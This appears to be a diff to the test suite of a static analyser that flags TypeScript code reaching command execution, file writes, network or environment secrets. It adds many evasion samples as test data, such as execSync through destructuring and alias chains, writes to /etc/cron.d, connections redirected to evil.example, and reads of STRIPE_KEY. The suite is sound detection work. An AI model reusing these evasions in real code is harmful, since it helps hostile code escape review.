@@ -241,6 +241,101 @@ const caught: Record<string, string> = {
   i35_project_this: "import * as cp from \"node:child_process\";\nfunction run(this: unknown) { return (this as any).execSync(\"id\"); }\nexport function t() { return run.call(cp); }",
   i36_cast_function_this: "import * as cp from \"node:child_process\";\ndeclare const handler: (this: unknown) => void;\nexport function t() { return (handler as any).call(cp); }",
   j06_library_this: "import * as fs from \"node:fs\";\nexport function t() { return fs.readFileSync.bind(fs); }",
+  // Engine re-verification (0.4): require() runs a file that only looks like an asset as JavaScript,
+  // or adds `.js` when it doesn't exist (./theme.css.js). Only a .json file that exists is data.
+  rve01_require_stylesheet: "export function t() { return require(\"./rve01-theme.css\"); }",
+  rve02_require_missing_json: "export function t() { return require(\"./rve02-data.json\"); }",
+  // A call through a callable interface, or a collection of functions, runs what's written against it.
+  rve03_callable_interface: "import { execSync } from \"node:child_process\";\ninterface Runner03 { (cmd: string): void }\nconst shell03: Runner03 = (cmd) => { execSync(cmd); };\nexport function t(run: Runner03, c: string) { return run(c); }",
+  rve04_map_of_functions: "import { execSync } from \"node:child_process\";\nconst ops04 = new Map<string, (arg: string) => unknown>();\nfunction register04() { ops04.set(\"run\", (arg) => execSync(arg)); }\nexport function t(op: string, arg: string) { return ops04.get(op)!(arg); }",
+  // Re-verification (detectors): capability functions destructured from a module or global, then used as values.
+  rd01_destructured_call: "import * as cp from \"node:child_process\";\nexport function t() { const { execSync: run } = cp; return run.call(null, \"id\"); }",
+  rd02_destructured_promisify: "import * as cp from \"node:child_process\";\nimport { promisify } from \"node:util\";\nexport function t() { const { exec } = cp; return promisify(exec)(\"id\"); }",
+  rd03_destructured_global_map: "export function t(urls: string[]) { const { fetch } = globalThis; return urls.map(fetch); }",
+  rd04_destructured_nested: "import * as fs from \"node:fs\";\nexport function t() { const { promises: { writeFile: w } } = fs; return w.call(null, \"/etc/x\", \"y\"); }",
+  rd05_destructured_parameter: "import * as cp from \"node:child_process\";\nexport function t({ execSync: run }: typeof cp) { return [\"id\"].map(run); }",
+  rd06_destructured_for_each: "import * as fs from \"node:fs\";\nexport function t(ps: string[]) { const { unlinkSync } = fs; ps.forEach(unlinkSync); }",
+  rd07_destructured_chdir_call: "export function t() { const { chdir } = process; chdir.call(process, \"/etc/cron.d\"); }",
+  rd08_destructured_then: "export function t(u: string) { const { fetch } = globalThis; return Promise.resolve(u).then(fetch); }",
+  rd09_destructured_assignment: "import * as cp from \"node:child_process\";\nexport function t() { let run: typeof cp.execSync; ({ execSync: run } = cp); return [\"id\"].map(run); }",
+  // require (or what createRequire returns) used as a value loads modules nothing traces.
+  rd10_require_call: "export function t() { return require.call(null, \"child_process\").exec(\"ls\"); }",
+  rd11_require_apply: "export function t() { return require.apply(null, [\"child_process\"]).exec(\"ls\"); }",
+  rd12_require_map: "export function t() { return [\"child_process\"].map(require)[0].exec(\"ls\"); }",
+  rd13_require_passed: "function load(r: (id: string) => any) { return r(\"child_process\"); }\nexport function t() { return load(require).exec(\"ls\"); }",
+  rd14_require_reflect: "export function t() { return Reflect.apply(require, null, [\"child_process\"]).execSync(\"id\"); }",
+  rd15_create_require_reflect: "import { createRequire } from \"node:module\";\nconst load = createRequire(__filename);\nexport function t() { return Reflect.apply(load, null, [\"child_process\"]).exec(\"ls\"); }",
+  rd16_require_then: "export function t() { return Promise.resolve(\"child_process\").then(require); }",
+  // Reflect.apply with a written-out list is a call with those arguments, like `.apply`.
+  rd17_reflect_apply_arguments: "export function t() { Reflect.apply(process.chdir, process, [\"/etc/cron.d\"]); }",
+  // bind with arguments fixes them for every later call: a call with those.
+  rd18_bind_arguments: "import * as fs from \"node:fs\";\nexport function t() { const w = fs.writeFileSync.bind(null, \"/etc/x\"); return w; }",
+  // A capability function inside what a module exports by default is used there, as in any other expression.
+  rd20_export_default_array: "import { execSync } from \"node:child_process\";\nexport default [execSync];",
+  rd21_export_default_arrow: "import { execSync } from \"node:child_process\";\nexport default { pick: () => execSync };",
+  rd22_export_default_map: "import { execSync } from \"node:child_process\";\nexport default new Map([[\"run\", execSync]]);",
+  // A chain of const aliases too long to follow is unverifiable, not nothing.
+  rd25_long_alias_chain: "import { execSync } from \"node:child_process\";\nconst a1 = execSync; const a2 = a1; const a3 = a2; const a4 = a3; const a5 = a4; const a6 = a5;\nconst a7 = a6; const a8 = a7; const a9 = a8; const a10 = a9; const a11 = a10; const a12 = a11;\nconst a13 = a12; const a14 = a13; const a15 = a14; const a16 = a15; const a17 = a16; const a18 = a17;\nconst a19 = a18; const a20 = a19; const a21 = a20; const a22 = a21; const a23 = a22; const a24 = a23;\nconst a25 = a24; const a26 = a25; const a27 = a26; const a28 = a27; const a29 = a28; const a30 = a29;\nconst a31 = a30; const a32 = a31; const a33 = a32; const a34 = a33; const a35 = a34;\nexport function t() { return [\"id\"].map(a35); }",
+  rd26_alias_chain_eleven: "import { execSync } from \"node:child_process\";\nconst a1 = execSync; const a2 = a1; const a3 = a2; const a4 = a3; const a5 = a4;\nconst a6 = a5; const a7 = a6; const a8 = a7; const a9 = a8; const a10 = a9; const a11 = a10;\nexport function t() { return a11.call(null, \"id\"); }",
+  // Timers that may run a string: lib.dom's evaluates one, and this suite has both lib.dom and Node's types.
+  rd30_timer_reflect_apply_string: "export function t() { Reflect.apply(setTimeout, window, [\"alert(1)\"]); }",
+  rd31_timer_for_each_strings: "export function t(codes: string[]) { codes.forEach(setTimeout); }",
+  rd32_timer_then_string: "export function t(code: string) { return Promise.resolve(code).then(setTimeout); }",
+  rd33_timer_any_handler: "export function t(body: string) { setTimeout(JSON.parse(body).code, 0); }",
+  rd34_timer_handler_type: "export function t(h: TimerHandler) { setTimeout(h, 0); }",
+  rd35_timer_string_or_function: "export function t(h: string | (() => void)) { window.setTimeout(h, 0); }",
+  // Script loaders and file writes that had no rule.
+  rd40_service_worker: "export function t() { return navigator.serviceWorker.register(\"/sw.js\"); }",
+  rd41_worklet_module: "export function t(ctx: AudioContext) { return ctx.audioWorklet.addModule(\"/w.js\"); }",
+  rd42_report_write: "export function t() { process.report.writeReport(\"/etc/cron.d/x\"); }",
+  rd43_compile_cache: "import module from \"node:module\";\nexport function t() { module.enableCompileCache(\"/etc/cron.d\"); }",
+  // Options that override the host a call names (checked against Node itself).
+  rd50_tls_options_host: "import tls from \"node:tls\";\nexport function t(d: string) { tls.connect(443, \"good.example\", { host: \"evil.example\" }).end(d); }",
+  rd51_tls_options_spread: "import tls from \"node:tls\";\nexport function t(o: tls.ConnectionOptions) { return tls.connect(443, \"good.example\", { ...o }); }",
+  rd52_http2_options_variable: "import http2 from \"node:http2\";\nexport function t(opts: http2.SecureClientSessionOptions) { return http2.connect(\"https://good.example\", opts); }",
+  rd53_http2_options_host: "import http2 from \"node:http2\";\nexport function t() { return http2.connect(\"https://good.example\", { host: \"evil.example\" } as http2.SecureClientSessionOptions); }",
+  rd54_http_agent_lookup: "import http from \"node:http\";\nimport type { LookupFunction } from \"node:net\";\ndeclare const lookup: LookupFunction;\nexport function t(d: string) { http.request({ hostname: \"good.example\", method: \"POST\", agent: new http.Agent({ lookup }) }).end(d); }",
+  rd55_http_agent_variable: "import https from \"node:https\";\nexport function t(agent: https.Agent) { return https.get(\"https://good.example/\", { agent }); }",
+  rd56_fetch_dispatcher: "export function t(d: string, dispatcher: unknown) { return fetch(\"http://good.example/collect\", { method: \"POST\", body: d, dispatcher } as RequestInit); }",
+  rd57_fetch_init_spread: "export function t(init: RequestInit) { return fetch(\"https://good.example/\", { ...init, method: \"POST\" }); }",
+  rd58_fetch_init_variable: "export function t(init: RequestInit) { return fetch(\"https://good.example/\", init); }",
+  rd59_http_agent_subclass: "import http from \"node:http\";\nimport net from \"node:net\";\nclass A extends http.Agent { createConnection() { return net.connect(443, \"evil.example\"); } }\nexport function t() { return http.request({ hostname: \"good.example\", agent: new A() }); }",
+  rd60_http_agent_const_written: "import https from \"node:https\";\nimport net from \"node:net\";\nconst agent = new https.Agent({ keepAlive: true });\nObject.assign(agent, { createConnection: () => net.connect(443, \"evil.example\") });\nexport function t() { return https.get({ hostname: \"good.example\", agent }); }",
+  // The environment destructured out of `process` (or `globalThis`) in one pattern.
+  rd70_env_nested_destructure: "export function t() { const { env: { STRIPE_KEY = \"x\" } } = process; return STRIPE_KEY; }",
+  rd71_env_nested_rest: "export function t() { const { env: { ...all } } = process; return all; }",
+  rd72_env_global_nested: "export function t() { const { process: { env: { STRIPE_KEY } } } = globalThis; return STRIPE_KEY; }",
+  rd73_env_parameter_nested: "export function t({ env: { STRIPE_KEY } }: NodeJS.Process = process) { return STRIPE_KEY; }",
+  rd74_env_assignment_pattern: "export function t() { let k: string | undefined; ({ env: { STRIPE_KEY: k } } = process); return k; }",
+  rd75_env_nested_computed: "export function t(name: string) { const { env: { [name]: v } } = process; return v; }",
+  rd76_env_quoted_key: "export function t() { const { \"STRIPE_KEY\": k, [\"OTHER\"]: o } = process.env; return [k, o]; }",
+  // Capability modules that lose their type through a copy, a generic or mapped parameter, or what a member returns.
+  rd80_module_spread_copy: "import * as cp from \"node:child_process\";\nexport function t() { const c = { ...cp }; return (c as any).exec(\"id\"); }",
+  rd81_module_generic_parameter: "import * as cp from \"node:child_process\";\nfunction run<T>(m: T) { return (m as any).exec(\"id\"); }\nexport function t() { return run(cp); }",
+  rd82_module_partial_parameter: "import * as cp from \"node:child_process\";\nfunction run(m: Partial<typeof cp>) { return (m as any).exec(\"id\"); }\nexport function t() { return run(cp); }",
+  rd83_module_member_constructed: "import dns from \"node:dns\";\nexport function t() { return new (dns as any).Resolver().resolve4(\"evil.example\"); }",
+  rd84_module_member_called: "import module from \"node:module\";\nexport function t() { return (module as any).createRequire(__filename)(\"child_process\").exec(\"ls\"); }",
+  rd85_module_socket_constructed: "import net from \"node:net\";\nexport function t() { return new (net as any).Socket().connect(443, \"evil.example\"); }",
+  // Destructured with a computed key (literal, or one that could be any member), or out of an array.
+  rd27_destructured_literal_key: "import * as cp from \"node:child_process\";\nexport function t() { const { [\"execSync\"]: run } = cp; return [\"id\"].map(run); }",
+  rd28_destructured_computed_key: "import * as cp from \"node:child_process\";\nexport function t(k: keyof typeof cp) { const { [k]: run } = cp; return run; }",
+  rd29_destructured_array: "import { execSync } from \"node:child_process\";\nexport function t(runners: (typeof execSync)[]) { const [run] = runners; return [\"id\"].map(run); }",
+  // An agent from a getter, or one whose type is lost, could connect anywhere.
+  rd61_http_agent_getter: "import http from \"node:http\";\ndeclare const other: http.Agent;\nexport function t() { return http.request({ hostname: \"good.example\", get agent() { return other; } }); }",
+  rd62_http_agent_untyped: "import http from \"node:http\";\ndeclare const AnyAgent: any;\nexport function t() { return http.request({ hostname: \"good.example\", agent: new AnyAgent() }); }",
+  // The environment taken apart in other patterns.
+  rd77_env_array_pattern: "export function t() { const [first] = process.env; return first; }",
+  rd78_env_assignment_rest: "export function t() { let all: object = {}; ({ env: { ...all } } = process); return all; }",
+  rd79_env_for_of_pattern: "export function t() { let k: string | undefined; for ({ env: { STRIPE_KEY: k } } of [process]); return k; }",
+  // A project that adds its variables to Node's environment type still reads the environment.
+  rd80_env_augmented_type: "declare global { namespace NodeJS { interface ProcessEnv { RD80_MODE?: string } } }\nexport function t() { return process.env.RD80_MODE; }",
+  // A module given to a rest parameter of a type parameter, or as an argument the function only reaches through `arguments`.
+  rd86_module_rest_generic: "import * as cp from \"node:child_process\";\nfunction all<T>(...ms: T[]) { return (ms[0] as any).exec(\"id\"); }\nexport function t() { return all(cp); }",
+  rd87_module_rest_type_parameter: "import * as cp from \"node:child_process\";\nfunction all<T extends unknown[]>(...ms: T) { return (ms[0] as any).exec(\"id\"); }\nexport function t() { return all(cp); }",
+  rd88_module_after_rest: "import * as cp from \"node:child_process\";\nimport * as path from \"node:path\";\nfunction run<T>(label: string, ...ms: T[]) { return (ms[1] as any).exec(label); }\nexport function t() { return run(\"id\", path, cp); }",
+  rd89_module_extra_argument: "import * as cp from \"node:child_process\";\nfunction none() { return (arguments[0] as any).exec(\"id\"); }\nexport function t() { return none(cp); }",
+  rd90_module_extra_after_parameters: "import * as cp from \"node:child_process\";\nfunction one(label: string) { return (arguments[1] as any).exec(label); }\nexport function t() { return one(\"id\", cp); }",
+  rd91_module_optional_generic: "import * as cp from \"node:child_process\";\nfunction maybe<T>(m?: T) { return (m as any)?.exec(\"id\"); }\nexport function t() { return maybe(cp); }",
 };
 
 // Harmless code that must not be reported, including common `any` casts that reach no capability.
@@ -264,7 +359,8 @@ const silent: Record<string, string> = {
   // Engine review (0.4): loading modules that touch nothing.
   en_fp01_require_pure: "export function t() { const p = require(\"path\"); return p.join(\"a\", \"b\"); }",
   en_fp02_import_const_pure: "const spec = \"node:path\";\nexport async function t() { return (await import(spec)).join(\"a\", \"b\"); }",
-  en_fp03_stylesheet: "import \"./missing-styles.css\";\nimport \"./missing-styles.css?inline\";\nexport const x = 1;",
+  // (en_fp03, a stylesheet import, moved to modules.test.ts: this project compiles imports to
+  // require(), which would run ./missing-styles.css.js. A bundler's project doesn't.)
   en_fp04_node_url: "export function t() { return new URL(\"data:text/plain,hello\").href; }",
   // A class with a same-named member that can't stand in for the interface isn't an implementation.
   // (All cases share one project, so these use member names no other case has.)
@@ -310,10 +406,36 @@ const silent: Record<string, string> = {
   fp25_reflect_get_reads: "export function t(k: string) { return [Reflect.get(globalThis, \"__APP__\"), Reflect.get(window, k)]; }",
   fp26_module_constant: "import * as fs from \"node:fs\";\nexport function t() { return fs.constants.F_OK; }",
   fp27_then_any_harmless: "export function t() { return Promise.resolve(1).then((n: any) => n + 1); }",
+  // Engine re-verification (0.4): a call through a callable type runs what's written against it,
+  // not every function that fits; and a callback runs as part of the code that passes it.
+  rve_fp01_fits_callable: "import { execSync } from \"node:child_process\";\ntype Runner06 = (cmd: string) => void;\nfunction shell06(cmd: string) { execSync(cmd); }\nexport function t(run: Runner06, c: string) { return run(c); }",
+  rve_fp02_callback_parameter: "import { execSync } from \"node:child_process\";\nfunction apply07(run: (c: string) => unknown, c: string) { return run(c); }\nfunction loud07() { return apply07((c) => execSync(c), \"x\"); }\nexport function t() { return apply07((c) => c.length, \"y\"); }",
+  // Re-verification (detectors): look-alikes of the newly caught forms.
+  rd_fp01_destructured_local: "const tools = { fetch: (id: string) => id, exec: (c: string) => c };\nexport function t(ids: string[]) { const { fetch, exec } = tools; return ids.map(fetch).concat(ids.map(exec)); }",
+  rd_fp02_destructured_pure_module: "import * as path from \"node:path\";\nexport function t(ps: string[]) { const { normalize } = path; return ps.map(normalize); }",
+  rd_fp03_destructured_constant: "import * as fs from \"node:fs\";\nexport function t() { const { constants: { F_OK } } = fs; return F_OK; }",
+  rd_fp10_require_members: "export function t() { return [require.resolve(\"node:path\"), require.main === module, Object.keys(require.cache).length, typeof require === \"function\"]; }",
+  rd_fp11_create_require_members: "import { createRequire } from \"node:module\";\nconst load = createRequire(__filename);\nexport function t() { return [load.resolve(\"node:path\"), load(\"node:path\")]; }",
+  rd_fp20_export_default_reference: "export default fetch;",
+  rd_fp25_boolean_detection: "export function t() { return [Boolean(globalThis.fetch), !!globalThis.WebSocket, Boolean(window.EventSource) && 1]; }",
+  rd_fp30_timer_functions: "export function t(h: () => void, hs: (() => void)[]) { hs.forEach(setTimeout); setTimeout(h, 1); return Promise.resolve(h).then(setTimeout); }",
+  rd_fp40_script_lookalikes: "export function t() { const registry = { register: (x: string) => x }; return [registry.register(\"/sw.js\"), process.report.getReport()]; }",
+  rd_fp50_host_options_precise: "import tls from \"node:tls\";\nimport net from \"node:net\";\nimport http from \"node:http\";\nimport http2 from \"node:http2\";\n/** @perm net(good.example) */\nexport function t(d: string) {\n  tls.connect(443, \"good.example\", { servername: \"good.example\", rejectUnauthorized: true }, () => {}).end(d);\n  tls.connect(443, \"good.example\", { host: \"good.example\" }).end(d);\n  net.connect(443, \"good.example\", () => {}).end(d);\n  http.request({ hostname: \"good.example\", agent: new http.Agent({ keepAlive: true }) }).end(d);\n  http.get(\"http://good.example/\", { agent: false });\n  http2.connect(\"https://good.example\", { host: \"good.example\" }, () => {});\n  http2.connect(\"https://good.example\", () => {});\n  return fetch(\"https://good.example/\", { method: \"POST\", headers: { a: \"b\" }, body: d, signal: undefined });\n}",
+  rd_fp51_shared_agent: "import https from \"node:https\";\nconst keepAlive = new https.Agent({ keepAlive: true });\nconst agent = new https.Agent();\n/** @perm net(good.example) */\nexport function t() { return [https.get({ hostname: \"good.example\", agent: keepAlive }), https.get(\"https://good.example/\", { agent })]; }\nexport function stop() { keepAlive.destroy(); }",
+  rd_fp70_env_lookalike_patterns: "/** @perm env(MODE) */\nexport function t(cfg: { env: { MODE: string; OTHER: string } }) { const { env: { OTHER } } = cfg; const { env: { MODE } } = process; let a = \"\"; ({ a } = { a: OTHER }); return [a, MODE]; }",
+  rd_fp71_own_process_env_type: "interface ProcessEnv { [key: string]: string }\ndeclare const settings: ProcessEnv;\nexport function t() { return [settings.MODE, settings]; }",
+  rd_fp80_module_kept_typed: "import * as cp from \"node:child_process\";\nimport * as path from \"node:path\";\nimport http from \"node:http\";\nfunction keep<T>(m: T) { return m; }\nfunction pick(m: Pick<typeof path, \"join\">) { return m.join(\"a\", \"b\"); }\n/** @perm exec */\nexport function t() { const copy = { ...path }; return [keep(path), pick(path), copy.join(\"a\"), (cp as any).execSync(\"id\"), (http as any).validateHeaderName(\"x-a\"), Object.freeze(cp)]; }",
+  rd_fp04_mapped_member_value: "type Ops = { [K in \"trim\"]: (x: string) => string };\ndeclare const ops: Ops;\nexport function t(xs: string[]) { return xs.map(ops.trim); }",
+  rd_fp05_destructured_computed_key: "const ops = { a: (s: string) => s, b: (s: string) => s.trim() };\nexport function t(k: \"a\" | \"b\", xs: string[]) { const { [k]: op } = ops; return xs.map(op); }",
+  rd_fp81_module_typed_parameter: "import * as cp from \"node:child_process\";\nfunction keep(m: { execSync: typeof cp.execSync }, label: string) { return label + typeof m; }\nexport function t() { return keep(cp, \"x\"); }",
 };
 
 const knownMisses: Record<string, { why: string; code: string }> = {
   c10_global_alias_any: { why: "a global stored as any, then a capability called through it (left silent: `const w = window as any` is common and harmless)", code: "export async function t(u: string) { const w = window as any; return w.fetch(u); }" },
+  rve05_collection_filled_through_parameter: {
+    why: "a function put in a collection through a parameter (written against the parameter's type, not the collection's) isn't linked to calls through the collection",
+    code: "import { execSync } from \"node:child_process\";\nconst jobs05 = new Map<string, () => void>();\nfunction add05(job: () => void) { jobs05.set(\"x\", job); }\n/** @perm exec */\nexport function init() { add05(() => { execSync(\"ls\"); }); }\nexport function t() { jobs05.get(\"x\")!(); }",
+  },
 };
 
 const typeRoots = [fileURLToPath(new URL("../node_modules/@types", import.meta.url))];
@@ -379,4 +501,55 @@ describe("silent", () => {
 
 describe("known misses (move to caught once fixed)", () => {
   for (const [name, { why }] of Object.entries(knownMisses)) it(`${name}: ${why}`, () => expect(errorsIn(name)).toEqual([]));
+});
+
+// Re-verification (detectors): the newly caught forms, reported with the scope they have.
+describe("re-verification (detectors): reported as the access it is", () => {
+  const capabilities = (name: string) => errorsIn(name).map((d) => d.capability).sort();
+  it("rd01_destructured_call", () => expect(capabilities("rd01_destructured_call")).toEqual(["exec"]));
+  it("rd03_destructured_global_map", () => expect(capabilities("rd03_destructured_global_map")).toEqual(["net"]));
+  it("rd04_destructured_nested", () => expect(capabilities("rd04_destructured_nested")).toEqual(["fs.write(/etc/x)"]));
+  it("rd07_destructured_chdir_call", () => expect(capabilities("rd07_destructured_chdir_call")).toEqual(["fs.read(/etc/cron.d)", "fs.write(/etc/cron.d)"]));
+  it("rd10_require_call", () => expect(capabilities("rd10_require_call")).toEqual(["unverifiable"]));
+  it("rd15_create_require_reflect", () => expect(capabilities("rd15_create_require_reflect")).toEqual(["unverifiable"]));
+  it("rd17_reflect_apply_arguments", () => expect(capabilities("rd17_reflect_apply_arguments")).toEqual(["fs.read(/etc/cron.d)", "fs.write(/etc/cron.d)"]));
+  it("rd18_bind_arguments", () => expect(capabilities("rd18_bind_arguments")).toEqual(["fs.write(/etc/x)"]));
+  it("rd25_long_alias_chain", () => expect(capabilities("rd25_long_alias_chain")).toEqual(["unverifiable"]));
+  it("rd26_alias_chain_eleven", () => expect(capabilities("rd26_alias_chain_eleven")).toEqual(["exec"]));
+  it("rd30_timer_reflect_apply_string", () => expect(capabilities("rd30_timer_reflect_apply_string")).toEqual(["unverifiable"]));
+  it("rd42_report_write", () => expect(capabilities("rd42_report_write")).toEqual(["fs.write(/etc/cron.d/x)"]));
+  it("rd43_compile_cache", () => expect(capabilities("rd43_compile_cache")).toEqual(["fs.read(/etc/cron.d)", "fs.write(/etc/cron.d)"]));
+  for (const name of ["rd50_tls_options_host", "rd51_tls_options_spread", "rd52_http2_options_variable", "rd53_http2_options_host", "rd54_http_agent_lookup", "rd55_http_agent_variable", "rd56_fetch_dispatcher", "rd57_fetch_init_spread", "rd58_fetch_init_variable", "rd59_http_agent_subclass"]) {
+    it(name, () => expect(capabilities(name)).toEqual(["net"]));
+  }
+  // The agent's const is changed, so the request could go anywhere; the top-level code that changes it is reported too.
+  it("rd60_http_agent_const_written", () => expect(errorsIn("rd60_http_agent_const_written").filter((d) => d.function === "t").map((d) => d.capability)).toEqual(["net"]));
+  it("rd70_env_nested_destructure", () => expect(capabilities("rd70_env_nested_destructure")).toEqual(["env(STRIPE_KEY)"]));
+  it("rd71_env_nested_rest", () => expect(capabilities("rd71_env_nested_rest")).toEqual(["env"]));
+  it("rd72_env_global_nested", () => expect(capabilities("rd72_env_global_nested")).toEqual(["env(STRIPE_KEY)"]));
+  it("rd73_env_parameter_nested", () => expect(capabilities("rd73_env_parameter_nested")).toEqual(["env(STRIPE_KEY)"]));
+  it("rd74_env_assignment_pattern", () => expect(capabilities("rd74_env_assignment_pattern")).toEqual(["env(STRIPE_KEY)"]));
+  it("rd75_env_nested_computed", () => expect(capabilities("rd75_env_nested_computed")).toEqual(["env"]));
+  // A quoted or literal computed key names the variable without its quotes.
+  it("rd76_env_quoted_key", () => expect(capabilities("rd76_env_quoted_key")).toEqual(["env(OTHER)", "env(STRIPE_KEY)"]));
+  for (const name of ["rd80_module_spread_copy", "rd81_module_generic_parameter", "rd82_module_partial_parameter", "rd83_module_member_constructed", "rd84_module_member_called", "rd85_module_socket_constructed"]) {
+    it(name, () => expect(capabilities(name)).toEqual(["unverifiable"]));
+  }
+  it("rd27_destructured_literal_key", () => expect(capabilities("rd27_destructured_literal_key")).toEqual(["exec"]));
+  it("rd28_destructured_computed_key", () => expect(capabilities("rd28_destructured_computed_key")).toEqual(["unverifiable"]));
+  it("rd29_destructured_array", () => expect(capabilities("rd29_destructured_array")).toEqual(["exec"]));
+  it("rd61_http_agent_getter", () => expect(capabilities("rd61_http_agent_getter")).toEqual(["net"]));
+  it("rd62_http_agent_untyped", () => expect(capabilities("rd62_http_agent_untyped")).toEqual(["net"]));
+  it("rd77_env_array_pattern", () => expect(capabilities("rd77_env_array_pattern")).toEqual(["env"]));
+  it("rd78_env_assignment_rest", () => expect(capabilities("rd78_env_assignment_rest")).toEqual(["env"]));
+  it("rd79_env_for_of_pattern", () => expect(capabilities("rd79_env_for_of_pattern")).toEqual(["env(STRIPE_KEY)"]));
+  it("rd80_env_augmented_type", () => expect(capabilities("rd80_env_augmented_type")).toEqual(["env(RD80_MODE)"]));
+  for (const name of ["rd86_module_rest_generic", "rd87_module_rest_type_parameter", "rd88_module_after_rest", "rd89_module_extra_argument", "rd90_module_extra_after_parameters", "rd91_module_optional_generic"]) {
+    it(name, () => expect(capabilities(name)).toEqual(["unverifiable"]));
+  }
+  // Named as the parameter's own type: the elements a rest parameter passes, or the type parameter it is.
+  it("rd86 and rd87 name the type the module is passed as", () => {
+    expect(errorsIn("rd86_module_rest_generic").map((d) => d.call)).toEqual(["cp passed on as `T`"]);
+    expect(errorsIn("rd87_module_rest_type_parameter").map((d) => d.call)).toEqual(["cp passed on as `T`"]);
+  });
 });
